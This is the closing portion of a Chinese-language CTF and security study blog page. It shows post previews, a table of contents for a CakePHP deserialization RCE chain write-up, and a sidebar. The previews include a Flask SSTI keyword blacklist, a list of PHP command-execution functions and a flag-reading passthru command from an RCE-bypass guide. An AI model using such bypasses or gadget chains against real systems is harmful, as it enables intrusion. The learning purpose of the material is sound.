:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126from flask import Flask, request, render_template_stringimport htmlapp = Flask(__name__)BLACKLIST = [    &#x27;init&#x27;,&#x27;globals&#x27;,&#x27;builtins&#x27;,&#x27;import&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#...</div></div></div></a><a class="pagination-related" href="/2025/07/15/hello-world/" title="Hello World"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-15</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment 相册教程https://blog.csdn.net/weixin_45509582/article/det...</div></div></div></a><a class="pagination-related" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-22</div><div class="info-item-2">命令执行(RCE)绕过技术</div></div><div class="info-2"><div class="info-item-1">命令执行(RCE)绕过技术全面指南参考https://blog.csdn.net/qq\_43431158/article/details/105422347，写到异或绕过 1.  基础概念RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 2. 常见执行函数2.1 PHP代码执行函数eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()等。 2.2 PHP命令执行函数system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()等。 passthru(&#39;tac fla*&#39;); 2.3 特殊函数利用 反引号执行：`ls` 或 &lt;?= ls ?&gt;（短标签形式）  无参数函数调用：PHP ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Abernethy</div><div class="author-info-description">「Abernethy」的网络安全研习录</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sebastian-AlphaX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Sebastian-AlphaX" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2926295043@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-CakePHP-5-1-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%93%BE%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%A6%82%E8%A7%88"><span class="toc-number">1.1.</span> <span class="toc-text">攻击链概览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E6%AF%8F%E4%B8%AA%E7%8E%AF%E8%8A%82"><span class="toc-number">1.2.</span> <span class="toc-text">详细分析每个环节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A5%E5%8F%A3%E7%82%B9-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 入口点 - 反序列化触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AC%AC%E4%B8%80%E7%8E%AF-RejectedPromise-destruct"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 第一环 - RejectedPromise::__destruct()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AC%AC%E4%BA%8C%E7%8E%AF-Response-toString"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 第二环 - Response::__toString()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%AC%AC%E4%B8%89%E7%8E%AF-Table-call"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. 第三环 - Table::__call()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%AC%AC%E5%9B%9B%E7%8E%AF-BehaviorRegistry-call"><span class="toc-number">1.2.5.</span> <span class="toc-text">5. 第四环 - BehaviorRegistry::call()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%AC%AC%E4%BA%94%E7%8E%AF-MockClass-generate-RCE"><span class="toc-number">1.2.6.</span> <span class="toc-text">6. 第五环 - MockClass::generate() - RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E6%9E%84%E9%80%A0"><span class="toc-number">1.3.</span> <span class="toc-text">完整攻击载荷构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9E%84%E9%80%A0MockClass%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 构造MockClass对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9E%84%E9%80%A0BehaviorRegistry%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 构造BehaviorRegistry对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%84%E9%80%A0Table%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 构造Table对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9E%84%E9%80%A0Response%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. 构造Response对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9E%84%E9%80%A0RejectedPromise%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. 构造RejectedPromise对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%BA%8F%E5%88%97%E5%8C%96%E5%B9%B6%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. 序列化并编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">攻击流程总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%8A%80%E5%B7%A7"><span class="toc-number">1.5.</span> <span class="toc-text">关键技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%B9%E8%B1%A1%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. 对象链构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%82%E6%95%B0%E6%8E%A7%E5%88%B6"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. 参数控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9D%A1%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. 条件绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.5.4.</span> <span class="toc-text">4. 类加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Questions"><span class="toc-number">1.6.</span> <span class="toc-text">Questions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%B8%BA%E4%BB%80%E4%B9%88-message-Unhandled-promise-rejection-with-this-reason-%E8%BF%99%E9%87%8C%E8%A6%81%E6%83%B3%E5%88%B0%E8%B0%83%E7%94%A8Response-toString"><span class="toc-number">1.7.</span> <span class="toc-text">1. 为什么$message &#x3D; &#39;Unhandled promise rejection with &#39; . $this-&gt;reason;这里要想到调用Response::__toString</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%B0%86Response%E5%AF%B9%E8%B1%A1%E8%AE%BE%E7%BD%AE%E4%B8%BARejectedPromise%E7%9A%84reason%E4%B9%8B%E5%90%8E%EF%BC%8C%E6%80%8E%E4%B9%88%E5%B0%B1%E8%83%BD%E8%B0%83%E7%94%A8-toString"><span class="toc-number">1.8.</span> <span class="toc-text">2. 将Response对象设置为RejectedPromise的reason之后，怎么就能调用__toString</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%BD%93%E8%B0%83%E7%94%A8Table%E5%AF%B9%E8%B1%A1%E4%B8%8A%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%96%B9%E6%B3%95%E6%97%B6%EF%BC%8C-call-%E6%96%B9%E6%B3%95%E8%A2%AB%E8%A7%A6%E5%8F%91%EF%BC%8C%E8%BF%99%E5%8F%A5%E8%AF%9D%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3%EF%BC%9F"><span class="toc-number">1.9.</span> <span class="toc-text">3. 当调用Table对象上不存在的方法时，__call()方法被触发，这句话怎么理解？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%B0%83%E7%94%A8%E5%AE%8CTable-call-%E4%B9%8B%E5%90%8E%E8%BF%98%E8%A6%81%E5%8E%BB%E8%B0%83%E7%94%A8BehaviorRegistry-call"><span class="toc-number">1.10.</span> <span class="toc-text">4. 为什么调用完Table::__call()之后还要去调用BehaviorRegistry::call()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-MockClass-generate-%E5%92%8C%E5%89%8D%E9%9D%A2%E7%9A%84%E9%93%BE%E6%98%AF%E4%BB%80%E4%B9%88%E5%85%B3%E7%B3%BB%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E5%AE%83"><span class="toc-number">1.11.</span> <span class="toc-text">5. MockClass::generate()和前面的链是什么关系，为什么不直接调用它</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.12.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-x20"><span class="toc-number">1.13.</span> <span class="toc-text">Reference </span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/N1CTF/N1CTF/" title="Untitled"><img src="https://img.shetu66.com/2023/08/03/1691035301699647.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Untitled"/></a><div class="content"><a class="title" href="/2025/09/22/N1CTF/N1CTF/" title="Untitled">Untitled</a><time datetime="2025-09-22T04:53:47.881Z" title="Created 2025-09-22 12:53:47">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="命令执行(RCE)绕过技术"/></a><div class="content"><a class="title" href="/2025/09/22/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术">命令执行(RCE)绕过技术</a><time datetime="2025-09-21T16:36:47.252Z" title="Created 2025-09-22 00:36:47">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——魔术方法"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP反序列化——魔术方法">PHP反序列化——魔术方法</a><time datetime="2025-09-21T16:24:00.575Z" title="Created 2025-09-22 00:24:00">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——字符串逃逸"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/" title="PHP反序列化——字符串逃逸">PHP反序列化——字符串逃逸</a><time datetime="2025-09-21T16:23:44.152Z" title="Created 2025-09-22 00:23:44">2025-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP"><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758515720098.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化——反序列化POP"/></a><div class="content"><a class="title" href="/2025/09/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP/" title="PHP反序列化——反序列化POP">PHP反序列化——反序列化POP</a><time datetime="2025-09-21T16:23:28.021Z" title="Created 2025-09-22 00:23:28">2025-09-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Abernethy</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>